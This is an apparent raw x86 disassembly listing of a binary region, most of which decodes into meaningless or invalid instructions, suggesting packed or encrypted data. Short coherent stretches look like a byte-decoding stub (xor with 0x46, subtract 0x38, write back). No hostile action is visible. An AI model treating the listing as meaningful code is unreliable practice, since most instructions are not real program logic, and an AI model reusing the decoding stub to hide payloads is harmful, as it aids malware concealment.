  4038c2:	lock pusha 
  4038c4:	into   
  4038c5:	or     al,0x37
  4038c7:	das    
  4038c8:	imul   DWORD PTR [eax-0x73ebb84b]
  4038ce:	mov    ecx,0xf5b2ecb2
  4038d3:	mov    ss,WORD PTR [esi-0x14]
  4038d6:	pop    es
  4038d7:	fld    st(5)
  4038d9:	enter  0xddbe,0x90
  4038dd:	add    DWORD PTR [edi-0x4d3f349f],0xffffffcb
  4038e4:	pop    es
  4038e5:	(bad)  
  4038e6:	jno    0x403900
  4038e8:	sti    
  4038e9:	outs   dx,DWORD PTR ds:[esi]
  4038ea:	in     eax,dx
  4038eb:	lods   eax,DWORD PTR ds:[esi]
  4038ec:	push   ss
  4038ed:	mov    BYTE PTR [eax+0x349902b2],dl
  4038f3:	(bad)  
  4038f4:	push   ecx
  4038f5:	sub    al,0x7
  4038f7:	cdq    
  4038f8:	scas   al,BYTE PTR es:[edi]
  4038f9:	loopne 0x403952
  4038fb:	cvtdq2ps xmm5,XMMWORD PTR [eax]
  4038fe:	int3   
  4038ff:	or     ah,ch
  403901:	lods   eax,DWORD PTR ds:[esi]
  403902:	jge    0x4038ad
  403904:	nop
  403905:	adc    bl,ah
  403907:	jbe    0x40397b
  403909:	sub    eax,0x18f2264b
  40390e:	cmp    BYTE PTR [esi+0x178f6458],al
  403914:	retf   0x16c9
  403917:	out    0x7e,eax
  403919:	inc    esp
  40391a:	enter  0x1c3,0x35
  40391e:	scas   eax,DWORD PTR es:[edi]
  40391f:	inc    esi
  403920:	sub    eax,DWORD PTR [esi]
  403922:	push   edi
  403923:	fisubr WORD PTR [eax]
  403925:	(bad)  
  403926:	dec    edx
  403927:	cmp    BYTE PTR [edi+0x32b5aa03],bl
  40392d:	push   0xfffffff7
  40392f:	sbb    DWORD PTR [edi+0x7d],0xffffffaa
  403933:	mov    ah,cl
  403935:	xlat   BYTE PTR ds:[ebx]
  403936:	or     esi,0x1191a7fd
  40393c:	add    BYTE PTR [ebx+eiz*8],cl
  40393f:	icebp  
  403940:	lea    ebp,[ecx-0x42]
  403943:	cdq    
  403944:	xor    DWORD PTR [ebp-0xe0c6ed2],esi
  40394a:	add    BYTE PTR [ebx-0x43],bl
  40394d:	sub    al,0xa7
  40394f:	imul   ebp,DWORD PTR [ecx],0x73
  403952:	inc    edi
  403953:	aaa    
  403954:	call   0x3960:0xc6c9ced0
  40395b:	push   ebp
  40395c:	data16 je 0x403976
  40395f:	push   es
  403960:	fist   WORD PTR [esi-0x79]
  403963:	cmp    cl,BYTE PTR [eax+ebp*8]
  403966:	dec    esi
  403967:	push   ecx
  403968:	sbb    eax,0xc9174683
  40396d:	adc    BYTE PTR [eax-0x75],al
  403970:	test   al,0x84
  403972:	xchg   esp,eax
  403973:	ret    
  403974:	loopne 0x40394b
  403976:	dec    eax
  403977:	mov    ds:0x589bb84c,al
  40397c:	ins    BYTE PTR es:[edi],dx
  40397d:	mov    al,0x3
  40397f:	(bad)  
  403980:	xlat   BYTE PTR ds:[ebx]
  403981:	je     0x40396a
  403983:	pop    ecx
  403984:	jl     0x40398e
  403986:	pop    ebp
  403987:	jp     0x4039b7
  403989:	mov    edi,0x4f6374b3
  40398e:	xchg   ch,bh
  403990:	outs   dx,DWORD PTR ds:[esi]
  403991:	popf   
  403992:	jp     0x4039e7
  403994:	test   eax,eax
  403996:	je     0x403dd2
  40399c:	lea    eax,[ebp-0x98]
  4039a2:	push   eax
  4039a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4039a6:	xor    eax,esi
  4039a8:	add    eax,edi
  4039aa:	push   eax
  4039ab:	mov    eax,DWORD PTR [ebp-0x18]
  4039ae:	add    eax,0xee
  4039b3:	push   eax
  4039b4:	mov    eax,DWORD PTR [ebp-0x18]
  4039b7:	mov    eax,DWORD PTR [eax+0x198]
  4039bd:	push   DWORD PTR [eax]
  4039bf:	jmp    0x403dcd
  4039c4:	push   es
  4039c5:	js     0x403a2e
  4039c7:	repnz popa 
  4039c9:	jno    0x40395e
  4039cb:	call   0xb3ee171
  4039d0:	dec    ebp
  4039d1:	scas   eax,DWORD PTR es:[edi]
  4039d2:	sbb    BYTE PTR [ecx],bh
  4039d4:	neg    DWORD PTR ds:0x7d6f7e7e
  4039da:	jle    0x403a5a
  4039dc:	jle    0x403a18
  4039de:	out    0xd6,al
  4039e0:	mov    cl,0x6b
  4039e2:	sbb    bl,BYTE PTR [edx+0x76440da8]
  4039e8:	(bad)  
  4039ea:	mov    bh,0xda
  4039ec:	mov    ecx,DWORD PTR [ebp+0x3f123ec]
  4039f2:	inc    ebx
  4039f3:	xor    al,0xd9
  4039f5:	dec    edx
  4039f6:	pushf  
  4039f7:	xor    BYTE PTR [ebp+eiz*8+0x61],bh
  4039fb:	jecxz  0x4039be
  4039fd:	mov    ah,0x65
  4039ff:	(bad)
  403a03:	or     eax,0x281d413a
  403a08:	sbb    DWORD PTR [ebp+ebp*8+0x42],0xffffff82
  403a0d:	jmp    0x55692fb5
  403a12:	inc    edx
  403a13:	sar    dh,cl
  403a15:	push   ebx
  403a16:	and    edx,DWORD PTR [ebp+0x7b55b9bf]
  403a1c:	sbb    eax,0x46405960
  403a21:	dec    eax
  403a22:	dec    esp
  403a23:	call   0x7b7:0x58ed2d55
  403a2a:	push   eax
  403a2b:	and    eax,0x51c20af1
  403a30:	add    eax,0x98d42de4
  403a35:	or     bl,BYTE PTR [ebp-0x79]
  403a38:	lods   eax,DWORD PTR ds:[esi]
  403a39:	jmp    0x8448:0xea01688f
  403a40:	ss inc eax
  403a42:	add    bh,BYTE PTR [ebp-0x5]
  403a45:	jp     0x403a4d
  403a47:	add    DWORD PTR [ebp+0x49c72bc5],edx
  403a4d:	(bad)  
  403a4e:	jecxz  0x4039d1
  403a50:	xor    ah,bh
  403a52:	leave  
  403a53:	push   ss
  403a54:	call   0x8e362782
  403a59:	xchg   ebp,eax
  403a5a:	cld    
  403a5b:	es pop esp
  403a5d:	inc    ebx
  403a5e:	jg     0x4039f0
  403a60:	mov    edx,0xb80f063e
  403a65:	xor    bl,BYTE PTR [eax-0x5a3b52ed]
  403a6b:	shl    BYTE PTR [eax],cl
  403a6d:	fimul  WORD PTR [eax+0x3c]
  403a70:	lea    ebx,[ecx]
  403a72:	push   esp
  403a73:	rcr    BYTE PTR [edx+0x37a86df8],0xd1
  403a7a:	icebp  
  403a7b:	sahf   
  403a7c:	jl     0x403a90
  403a7e:	ret    0x1a12
  403a81:	xor    eax,0xfbcb1ef9
  403a86:	(bad)  
  403a87:	ds mov ebx,0xcd46e904
  403a8d:	add    eax,0x8d2f16a5
  403a92:	xor    esi,0x4b
  403a95:	arpl   ax,di
  403a97:	inc    ebx
  403a98:	hlt    
  403a99:	lods   eax,DWORD PTR ds:[esi]
  403a9a:	add    al,0xbd
  403a9c:	cmp    DWORD PTR [esi+0x3677028f],eax
  403aa2:	and    ch,BYTE PTR [bp-0x5994]
  403aa7:	ret    
  403aa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403aa9:	jmp    0x28c0af70
  403aae:	and    al,0x4a
  403ab0:	xor    dl,dl
  403ab2:	in     eax,0x96
  403ab4:	pop    es
  403ab5:	pop    ss
  403ab6:	call   FWORD PTR [ebx+0x175dc9a8]
  403abc:	inc    ecx
  403abd:	cdq    
  403abe:	in     al,dx
  403abf:	pop    ebp
  403ac0:	xchg   ecx,eax
  403ac1:	inc    esi
  403ac2:	dec    ecx
  403ac3:	inc    ebp
  403ac4:	cdq    
  403ac5:	loopne 0x403b3e
  403ac7:	add    dl,BYTE PTR [edx-0x58]
  403aca:	pop    ebx
  403acb:	out    0x26,eax
  403acd:	lahf   
  403ace:	add    eax,0x28cfa3c5
  403ad3:	clc    
  403ad4:	jnp    0x403abe
  403ad6:	or     eax,edx
  403ad8:	mov    WORD PTR [eax],cs
  403ada:	dec    ebp
  403adb:	mul    BYTE PTR [edi]
  403add:	cmp    al,cl
  403adf:	inc    ebx
  403ae0:	add    BYTE PTR [edi],cl
  403ae2:	out    0x48,eax
  403ae4:	pop    edx
  403ae5:	inc    edx
  403ae6:	(bad)
  403aea:	das    
  403aeb:	fcom   QWORD PTR [edi+0xd024fb2]
  403af1:	(bad)  
  403af2:	cli    
  403af3:	int3   
  403af4:	push   esi
  403af5:	pop    ss
  403af6:	xor    esp,DWORD PTR [eax-0x60]
  403af9:	jmp    0xf259:0xa13bcf2
  403b00:	xor    DWORD PTR [edi],ebp
  403b02:	repz pop ebp
  403b04:	addr16 mov dh,0x38
  403b07:	popf   
  403b08:	ins    DWORD PTR es:[edi],dx
  403b09:	sbb    ebp,DWORD PTR [ebp-0xe]
  403b0c:	xor    eax,0x1ed7bb7a
  403b11:	popf   
  403b12:	ja     0x403b0c
  403b14:	fadd   st(1),st
  403b16:	popa   
  403b17:	cmp    DWORD PTR ds:0x76ab2df4,ebp
  403b1d:	jns    0x403aef
  403b1f:	test   DWORD PTR [ebx+0x242b0e5a],esp
  403b25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b26:	clc    
  403b27:	leave  
  403b28:	fistp  QWORD PTR [ebp+0x5a671bc7]
  403b2e:	jae    0x403ba8
  403b30:	and    BYTE PTR [esi+0x407cda9e],0x54
  403b37:	dec    eax
  403b38:	pushf  
  403b39:	add    esi,edx
  403b3b:	jge    0x403ae7
  403b3d:	add    BYTE PTR [esi],ch
  403b3f:	fidivr DWORD PTR [eax-0x683b2a5b]
  403b45:	stc    
  403b46:	xchg   BYTE PTR ds:0x7cffbad2,ah
  403b4c:	adc    esi,DWORD PTR [edi-0x16]
  403b4f:	xchg   ebx,eax
  403b50:	push   esp
  403b51:	call   0xf90c:0x927a51a9
  403b58:	push   cs
  403b59:	jbe    0x403b99
  403b5b:	outs   dx,DWORD PTR ds:[esi]
  403b5c:	sbb    BYTE PTR [edx],0x54
  403b5f:	mov    DWORD PTR [eax],0x33789c58
  403b65:	outs   dx,BYTE PTR ds:[esi]
  403b66:	or     bh,dl
  403b68:	popa   
  403b69:	xor    al,0xda
  403b6b:	dec    ecx
  403b6c:	cs jle 0x403b8d
  403b6f:	ins    BYTE PTR es:[edi],dx
  403b70:	iret   
  403b71:	clc    
  403b72:	in     eax,dx
  403b73:	cdq    
  403b74:	pushf  
  403b75:	arpl   WORD PTR [edx-0x3b],ax
  403b78:	xchg   ebx,eax
  403b79:	out    dx,eax
  403b7a:	add    ebx,esp
  403b7c:	loop   0x403b27
  403b7e:	xchg   edi,eax
  403b7f:	jae    0x403b8a
  403b81:	inc    edx
  403b82:	cli    
  403b83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b84:	dec    ebx
  403b85:	mov    bh,0xb5
  403b87:	fwait
  403b88:	sub    DWORD PTR [esi+0x78b19652],ebp
  403b8e:	add    BYTE PTR [ebx-0x50],ah
  403b91:	repz (bad) 
  403b93:	in     al,dx
  403b94:	push   0x8
  403b96:	adc    dl,BYTE PTR [ebp+0x18493807]
  403b9c:	or     ah,BYTE PTR [eax]
  403b9e:	push   ecx
  403b9f:	(bad)  
  403ba0:	scas   eax,DWORD PTR es:[edi]
  403ba1:	mov    ecx,0xd3c793bd
  403ba6:	mov    edx,0x55b9fb3e
  403bab:	add    al,0x95
  403bad:	sbb    al,0x3e
  403baf:	add    DWORD PTR [edi+0x1b],ebx
  403bb2:	ja     0x403b7a
  403bb4:	cmc    
  403bb5:	and    eax,0x92619656
  403bba:	shl    DWORD PTR [eax],1
  403bbc:	lock xlat BYTE PTR ds:[ebx]
  403bbe:	push   eax
  403bbf:	mov    ch,BYTE PTR [eax+0x30275efe]
  403bc5:	sbb    cl,BYTE PTR [edi-0x1a]
  403bc8:	loop   0x403c0b
  403bca:	sar    DWORD PTR [esi+edx*2],1
  403bcd:	sub    BYTE PTR [edi],ah
  403bcf:	ds cs xchg ebx,eax
  403bd2:	mov    edx,0x4084d818
  403bd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bd8:	add    al,0x89
  403bda:	lods   al,BYTE PTR ds:[esi]
  403bdb:	mov    ebp,0xf0e79e26
  403be0:	xor    DWORD PTR [edx-0x42bfb44],0xa56ffa67
  403bea:	adc    edx,DWORD PTR fs:[edi+ebx*1-0x203b7a93]
  403bf2:	inc    esp
  403bf3:	push   esi
  403bf4:	xchg   ax,ax
  403bf6:	shl    esp,1
  403bf8:	cld    
  403bf9:	out    0x94,al
  403bfb:	imul   ecx,ebp,0xffffffb2
  403bfe:	adc    al,0x6e
  403c00:	or     al,0xe0
  403c02:	xchg   ecx,eax
  403c03:	stos   BYTE PTR es:[edi],al
  403c04:	mov    dl,0xea
  403c06:	mov    esp,0xbb343258
  403c0b:	sub    al,0xe3
  403c0d:	lds    edi,FWORD PTR [ecx+0x1]
  403c10:	xor    BYTE PTR [ebx+0x70e0c0e2],0x88
  403c17:	popa   
  403c18:	cld    
  403c19:	popf   
  403c1a:	inc    edx
  403c1b:	fistp  DWORD PTR ds:0x8bb8017
  403c21:	mov    ebp,0x82060470
  403c26:	addr16 mov ch,0x91
  403c29:	mov    ebp,0xbbaea0fa
  403c2e:	pop    eax
  403c2f:	xchg   esp,eax
  403c30:	sbb    BYTE PTR [eax],bh
  403c32:	stc    
  403c33:	add    eax,DWORD PTR [eax+0x66]
  403c36:	and    DWORD PTR ds:0xbb5abfc0,ecx
  403c3c:	mov    eax,ds:0x9c13c90f
  403c41:	shl    DWORD PTR [edx-0x231a8df3],cl
  403c47:	ins    DWORD PTR es:[edi],dx
  403c48:	scas   eax,DWORD PTR es:[edi]
  403c49:	jl     0x403ca4
  403c4b:	fmul   DWORD PTR [ebp-0x4feacfd4]
  403c51:	push   eax
  403c52:	inc    ebp
  403c53:	jge    0x403c38
  403c55:	fcomp  st(7)
  403c57:	xor    esi,eax
  403c59:	fwait
  403c5a:	cwde   
  403c5b:	(bad)  
  403c5c:	int    0x78
  403c5e:	clc    
  403c5f:	fcom   DWORD PTR [ebx-0x4e]
  403c62:	cs push eax
  403c64:	pop    ecx
  403c65:	mov    ecx,0x6b839b09
  403c6a:	daa    
  403c6b:	mov    al,ds:0xdb1eb614
  403c70:	pop    ebp
  403c71:	cmp    edx,DWORD PTR [eax+0x5d]
  403c74:	dec    ebx
  403c75:	dec    esi
  403c76:	jne    0x403cd5
  403c78:	sbb    eax,0xbbc8feed
  403c7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c7e:	pop    es
  403c7f:	repz rol BYTE PTR [ecx],cl
  403c82:	das    
  403c83:	neg    BYTE PTR [edx-0x54381cbf]
  403c89:	pop    ebx
  403c8a:	mov    bl,0x97
  403c8c:	dec    edi
  403c8d:	add    DWORD PTR [ebx+0x3138742],edi
  403c93:	jg     0x403d01
  403c95:	fbld   TBYTE PTR [eax]
  403c97:	sub    DWORD PTR [ebp-0x76],edx
  403c9a:	mov    WORD PTR [ecx-0x358ba818],ss
  403ca0:	out    dx,eax
  403ca1:	int    0x53
  403ca3:	pop    ds
  403ca4:	int3   
  403ca5:	enter  0x7ef3,0xff
  403ca9:	fadd   QWORD PTR [edx-0x723e4003]
  403caf:	adc    edi,DWORD PTR [eax+edi*2-0x11b4ea0d]
  403cb6:	(bad)  
  403cb7:	std    
  403cb8:	gs in  eax,dx
  403cba:	std    
  403cbb:	mov    dh,0x8b
  403cbd:	std    
  403cbe:	xor    eax,DWORD PTR [ebx-0x10e1402c]
  403cc4:	jmp    0x3981df2f
  403cc9:	cmp    eax,0x39d935bd
  403cce:	cdq    
  403ccf:	cmc    
  403cd0:	les    edi,FWORD PTR [esi]
  403cd2:	cmp    eax,0x5e766a97
  403cd7:	push   esp
  403cd8:	and    DWORD PTR ds:0x2db71fb8,esi
  403cde:	add    DWORD PTR [ecx-0x4c54fe0a],ebp
  403ce4:	dec    ecx
  403ce5:	xchg   ebp,edi
  403ce7:	push   ds
  403ce8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ce9:	test   eax,esp
  403ceb:	ja     0x403cce
  403ced:	jmp    0x403d26
  403cef:	jnp    0x403d18
  403cf1:	retf   
  403cf2:	or     ebp,eax
  403cf4:	loopne 0x403d71
  403cf6:	and    eax,0x353de829
  403cfb:	mov    gs,WORD PTR [ecx+0x250a1ada]
  403d01:	push   ebx
  403d02:	fcom   st(6)
  403d04:	xchg   ebx,eax
  403d05:	pop    ecx
  403d06:	sbb    ebp,DWORD PTR [edi+0x5087f10c]
  403d0c:	mov    esi,0xb55c9fcc
  403d11:	repz pop ds
  403d13:	repnz dec ecx
  403d15:	lock jg 0x403d28
  403d18:	retf   0xd5a7
  403d1b:	cmp    al,0x1f
  403d1d:	jo     0x403d62
  403d1f:	sub    eax,0x675337cd
  403d24:	pop    edx
  403d25:	push   es
  403d26:	dec    esp
  403d27:	push   cs
  403d28:	push   0xffffff8a
  403d2a:	xchg   edx,eax
  403d2b:	inc    esi
  403d2c:	push   edi
  403d2d:	stos   BYTE PTR es:[edi],al
  403d2e:	sbb    eax,0x464fc97f
  403d33:	bound  ecx,QWORD PTR [ecx-0x1]
  403d36:	push   esi
  403d37:	sbb    BYTE PTR [edi+0x19f882dd],ah
  403d3d:	call   0x7bb2f6fe
  403d42:	adc    BYTE PTR [ebx-0x59],ch
  403d45:	push   es
  403d46:	cmp    dh,BYTE PTR [esi+0xe0a9ba0]
  403d4c:	push   es
  403d4d:	mul    BYTE PTR [ebx]
  403d4f:	or     al,0xf9
  403d51:	pop    ecx
  403d52:	inc    esp
  403d53:	sbb    ebp,DWORD PTR ds:0x6105568f
  403d59:	or     eax,0x5ecfc492
  403d5e:	pop    edi
  403d5f:	xchg   esi,eax
  403d60:	add    BYTE PTR [eax],ch
  403d62:	aad    0x98
  403d64:	dec    esp
  403d65:	dec    edi
  403d66:	sub    BYTE PTR [ebx+edx*4],dh
  403d69:	jno    0x403daa
  403d6b:	add    BYTE PTR [edx-0x7bd201b0],cl
  403d71:	cdq    
  403d72:	clc    
  403d73:	mov    fs,edx
  403d75:	or     ebx,ebp
  403d77:	sub    al,0x5e
  403d79:	sbb    eax,0x4d684c1b
  403d7e:	mov    bh,0x38
  403d80:	sbb    bh,BYTE PTR ds:0xe38f683e
  403d86:	retf   
  403d87:	jge    0x403d2e
  403d89:	ins    BYTE PTR es:[edi],dx
  403d8a:	dec    esi
  403d8b:	ror    BYTE PTR [ebp-0x314922c6],cl
  403d91:	popf   
  403d92:	shr    BYTE PTR [edi+0x1c302d38],1
  403d98:	jl     0x403dbb
  403d9a:	mov    ecx,0xb747ee74
  403d9f:	jns    0x403d67
  403da1:	inc    BYTE PTR [eax]
  403da3:	inc    edi
  403da4:	pop    edi
  403da5:	sbb    ch,dl
  403da7:	(bad)  cs:[edi-0x13253d3f]
  403dae:	xor    edi,DWORD PTR [ecx+eax*8+0x669013fd]
  403db5:	jbe    0x403de0
  403db7:	leave  
  403db8:	jb     0x403e0d
  403dba:	rcr    BYTE PTR [eax+esi*2-0x16],0x9d
  403dbf:	cmp    eax,0xdb61a20
  403dc4:	add    eax,0xfe791c3
  403dc9:	jae    0x403e01
  403dcb:	addr16 cmp al,ch
  403dce:	mov    DWORD PTR [edx+0x4d8b0000],0xb8ce33d8
  403dd8:	gs (bad) 
  403dda:	int    0xff
  403ddc:	sub    eax,ecx
  403dde:	sub    eax,DWORD PTR [ebp-0x4]
  403de1:	mov    ecx,DWORD PTR [ebp-0x48]
  403de4:	add    ecx,eax
  403de6:	mov    eax,DWORD PTR [ebp-0x4]
  403de9:	mov    DWORD PTR [eax+0x1],ecx
  403dec:	mov    al,BYTE PTR [ebp-0x11]
  403def:	mov    ecx,DWORD PTR [ebp-0x4]
  403df2:	xor    al,0x46
  403df4:	sub    al,0x38
  403df6:	mov    BYTE PTR [ecx],al
  403df8:	lea    eax,[ebp-0x4]
  403dfb:	inc    BYTE PTR [eax]
  403dfd:	inc    eax
  403dfe:	push   eax
  403dff:	pop    ecx
  403e00:	dec    ecx
  403e01:	jmp    0x40420f
  403e06:	dec    esp
  403e07:	repz repz adc esi,DWORD PTR [ecx+0x13]
  403e0c:	ins    BYTE PTR es:[edi],dx
  403e0d:	jno    0x403e09
  403e0f:	in     eax,0x73
  403e11:	sbb    DWORD PTR [ebp+0x62],ebp
  403e14:	push   es
  403e15:	mov    eax,ds:0x7e7e19e4
  403e1a:	outs   dx,DWORD PTR ds:[esi]
  403e1b:	jge    0x403e9b
  403e1d:	jle    0x403e6c
  403e1f:	add    DWORD PTR [ecx-0x3c],ebx
  403e22:	push   edx
  403e23:	mov    al,0x7c
  403e25:	sub    al,bl
  403e27:	mov    al,0xc8
  403e29:	es test ch,al
  403e2c:	pop    es
  403e2d:	dec    eax
  403e2e:	fmul   QWORD PTR [ebp+0x78d5777d]
  403e34:	mov    al,ds:0x831c638
  403e39:	hlt    
  403e3a:	push   eax
  403e3b:	xor    esp,esi
  403e3d:	or     BYTE PTR [ebx-0x2ca86ef1],0x6
  403e44:	mov    esp,0xc40b2631
  403e49:	xchg   esp,eax
  403e4a:	pop    edi
  403e4b:	mov    eax,0xa421eb65
  403e50:	pushf  
  403e51:	ins    DWORD PTR es:[edi],dx
  403e52:	stos   DWORD PTR es:[edi],eax
  403e53:	sbb    al,0xbe
  403e55:	scas   eax,DWORD PTR es:[edi]
  403e56:	loopne 0x403e9c
  403e58:	lock popa 
  403e5a:	(bad)  
  403e5b:	shl    BYTE PTR [edx-0x27729b33],0x0
  403e62:	push   ebp
  403e63:	sbb    eax,0x8f642811
  403e68:	in     al,dx
  403e69:	mov    edx,0x1344b65e
  403e6e:	stos   DWORD PTR es:[edi],eax
  403e6f:	fs push 0x73b50630
  403e75:	fisubr WORD PTR [esi+ecx*2+0x30]
  403e79:	or     dh,dl
  403e7b:	jae    0x403e2b
  403e7d:	pop    ss
  403e7e:	(bad)  
  403e7f:	fcom   DWORD PTR [eax]
  403e81:	in     eax,dx
  403e82:	jno    0x403e35
  403e84:	cmp    DWORD PTR [esp+ebp*4],0xffffffdf
  403e88:	scas   al,BYTE PTR es:[edi]
  403e89:	test   al,0xc1
  403e8b:	out    0x13,eax
  403e8d:	sahf   
  403e8e:	sub    al,0xb6
  403e90:	aaa    
  403e91:	sub    al,0x5b
  403e93:	fmul   DWORD PTR [edx+0x51]
  403e96:	xor    edx,DWORD PTR [eax+0x714b8e5b]
  403e9c:	jns    0x403f08
  403e9e:	(bad)  
  403e9f:	cli    
  403ea0:	push   DWORD PTR ds:[ecx]
  403ea3:	inc    eax
  403ea4:	adc    BYTE PTR [ebx-0x41],dh
  403ea7:	inc    esi
  403ea8:	dec    esp
  403ea9:	shl    BYTE PTR [ebx-0x35],0xac
  403ead:	push   ebx
  403eae:	and    bl,BYTE PTR [eax+0x68e64bed]
  403eb4:	push   esi
  403eb5:	sub    al,0x25
  403eb7:	mov    dl,0xf5
  403eb9:	(bad)  
  403eba:	xor    eax,0xbb6105c5
  403ebf:	aaa    
  403ec0:	add    eax,0xe85a83c3
  403ec5:	(bad)  
  403ec7:	dec    eax
  403ec8:	jl     0x403e6f
  403eca:	addr16 adc eax,0xd64971cf
  403ed0:	add    al,ah
  403ed2:	sbb    eax,0xfacf3a34
  403ed7:	scas   eax,DWORD PTR es:[edi]
  403ed8:	mov    DWORD PTR [ecx],esi
  403eda:	cmp    dh,BYTE PTR [eax+eiz*1+0x6875059c]
  403ee1:	shr    DWORD PTR [ecx-0x2f6a0758],0x28
  403ee8:	mov    esi,0xd4d9f741
  403eed:	cs xor esi,ebx
  403ef0:	(bad)  
  403ef1:	inc    ebp
  403ef2:	and    DWORD PTR [ebx+ebp*8-0x67],edi
  403ef6:	inc    ebx
  403ef7:	(bad)  
  403ef8:	jmp    FWORD PTR [edx]
  403efa:	cdq    
  403efb:	cwde   
  403efc:	gs or  eax,0xaa3cefe8
  403f02:	mov    ebx,0x60b13dbd
  403f07:	push   edi
  403f08:	mov    al,ds:0xef357fe
  403f0d:	sbb    DWORD PTR [bp+si+0x32d8],ebp
  403f12:	mov    dl,0xa8
  403f14:	cli    
  403f15:	lods   al,BYTE PTR ds:[esi]
  403f16:	sbb    al,0x4b
  403f18:	xor    eax,0x76fa115f
  403f1d:	test   DWORD PTR [edx+eax*1-0x1c199b0],esp
  403f24:	push   eax
  403f25:	jmp    0x681d:0x27f296fa
  403f2c:	jb     0x403f1d
  403f2e:	push   ss
  403f2f:	mov    ch,0x84
  403f31:	mov    ds:0xe646a7bb,eax
  403f36:	popa   
  403f37:	in     al,0x6c
  403f39:	push   ebp
  403f3a:	xchg   esp,eax
  403f3b:	pop    esi
  403f3c:	cld    
  403f3d:	cmp    al,0x84
  403f3f:	js     0x403f7c
  403f41:	outs   dx,DWORD PTR ds:[esi]
  403f42:	into   
  403f43:	or     eax,0x56bb3f97
  403f48:	fsubr  QWORD PTR [eax-0x50]
  403f4b:	fdivr  QWORD PTR [esi]
  403f4d:	xchg   edx,eax
  403f4e:	xor    esp,esi
  403f50:	jecxz  0x403f39
  403f52:	and    eax,ecx
  403f54:	(bad)  
  403f55:	call   0x1011dbba
  403f5a:	dec    ecx
  403f5b:	test   DWORD PTR [ebp-0x2ccbe9cb],ebp
  403f61:	inc    ecx
  403f62:	or     esi,ebx
  403f64:	enter  0x75e5,0x7f
  403f68:	mov    edi,DWORD PTR [ebx-0x20fad8ac]
  403f6e:	ror    ebp,0xfb
  403f71:	push   edi
  403f72:	lods   al,BYTE PTR ds:[esi]
  403f73:	ins    DWORD PTR es:[edi],dx
  403f74:	and    BYTE PTR [edx-0x39a12916],0x52
  403f7b:	jae    0x403fcc
  403f7d:	jb     0x403f8d
  403f7f:	imul   eax,DWORD PTR [edx-0x56382a69],0x34
  403f86:	inc    esi
  403f87:	into   
  403f88:	or     al,0x1b
  403f8a:	jnp    0x403f30
  403f8c:	rcl    cl,1
  403f8e:	inc    edx
  403f8f:	and    BYTE PTR [ecx],ch
  403f91:	mov    ch,0xb9
  403f93:	push   ebx
  403f94:	pop    ds
  403f95:	fistp  QWORD PTR [ecx]
  403f97:	push   es
  403f98:	cmp    eax,0x8a0a0f13
  403f9d:	or     eax,0x368d5784
  403fa2:	sti    
  403fa3:	sub    ch,dl
  403fa5:	pop    ds
  403fa6:	in     al,0x1c
  403fa8:	sub    ecx,DWORD PTR [edi-0x3b4d853c]
  403fae:	push   ebp
  403faf:	xchg   edx,eax
  403fb0:	cmp    edx,ecx
  403fb2:	stc    
  403fb3:	adc    DWORD PTR [edi],ebp
  403fb5:	pop    eax
  403fb6:	lea    ebp,[esp+edx*4-0x6b]
  403fba:	adc    esi,esi
  403fbc:	cmp    cl,BYTE PTR [ebx]
  403fbe:	xor    DWORD PTR [esi],0xe7061f5d
  403fc4:	jge    0x403fa7
  403fc6:	xchg   edx,eax
  403fc7:	xor    al,0xc2
  403fc9:	add    eax,0xef56ee41
  403fce:	arpl   WORD PTR [edx+edx*4+0x63adf008],bp
  403fd5:	add    eax,0xd8e0969b
  403fda:	xor    al,0xad
  403fdc:	(bad)  
  403fdd:	push   ebp
  403fde:	inc    eax
  403fdf:	adc    al,0x77
  403fe1:	or     DWORD PTR [edx],edx
  403fe3:	imul   eax,ebx,0x6d
  403fe6:	outs   dx,BYTE PTR ds:[esi]
  403fe7:	jg     0x403fa8
  403fe9:	add    ebx,edx
  403feb:	outs   dx,DWORD PTR ds:[esi]
  403fec:	iret   
  403fed:	imul   ecx,eax,0xffffffcc
  403ff0:	mov    ch,0xbf
  403ff2:	aaa    
  403ff3:	(bad)
  403ff6:	inc    edx
  403ff7:	ds inc ebp
  403ff9:	jmp    0x7d52:0x9b8aeb99
  404000:	mov    eax,0x6cc67b82
  404005:	xor    eax,0x722f367a
  40400a:	jg     0x404008
  40400c:	int    0x55
  40400e:	sbb    cl,BYTE PTR [ebp-0x74]
  404011:	data16 out dx,al
  404013:	inc    eax
  404014:	or     ah,BYTE PTR ds:[esi+0x65]
  404018:	jno    0x404085
  40401a:	adc    bh,ch
  40401c:	sub    DWORD PTR [edi],ebx
  40401e:	cdq    
  40401f:	pushf  
  404020:	call   FWORD PTR [eax]
  404022:	xchg   esi,eax
  404023:	adc    eax,0xfabf97ec
  404028:	arpl   WORD PTR [esi+0x6f],bp
  40402b:	dec    esi
  40402c:	ror    DWORD PTR [esi-0x2acffc9],1
  404032:	outs   dx,DWORD PTR ds:[esi]
  404033:	leave  
  404034:	int    0xc0
  404036:	sub    edi,ebp
  404038:	or     al,0xf0
  40403a:	jnp    0x403fe8
  40403c:	or     DWORD PTR [eax],ebx
  40403e:	in     al,dx
  40403f:	or     ecx,ebp
  404041:	loopne 0x403fe5
  404043:	retf   0xdae6
  404046:	cli    
  404047:	mov    bl,0x40
  404049:	dec    edi
  40404a:	pop    ds
  40404b:	inc    ebx
  40404c:	repz cmp BYTE PTR [edx-0x1d321caf],0x35
  404054:	mov    al,ds:0xd5e67bed
  404059:	ds popf 
  40405b:	jbe    0x4040a8
  40405d:	jmp    0x9bf1:0x283aabad
  404064:	cmp    eax,0xe4cf592a
  404069:	mov    al,ds:0x4cdab5ab
  40406e:	sti    
  40406f:	inc    esi
  404070:	mov    ds:0x8ed5ad32,al
  404075:	imul   eax,DWORD PTR [edx+0x51f7ef42],0xfffffff2
  40407c:	cmp    al,0xff
  40407e:	mov    dl,0x75
  404080:	and    edi,edx
  404082:	mov    dl,0x39
  404084:	xchg   ebx,eax
  404085:	pop    ds
  404086:	jno    0x404081
  404088:	jb     0x4040d3
  40408a:	js     0x40409a
  40408c:	dec    ebx
  40408d:	jae    0x40401f
  40408f:	xor    DWORD PTR [ecx],0x23
  404092:	sbb    eax,0x3af8debb
  404097:	ja     0x404056
  404099:	call   0x6a32:0xd2a6bc87
  4040a0:	jno    0x4040b0
  4040a2:	cmp    al,0xc2
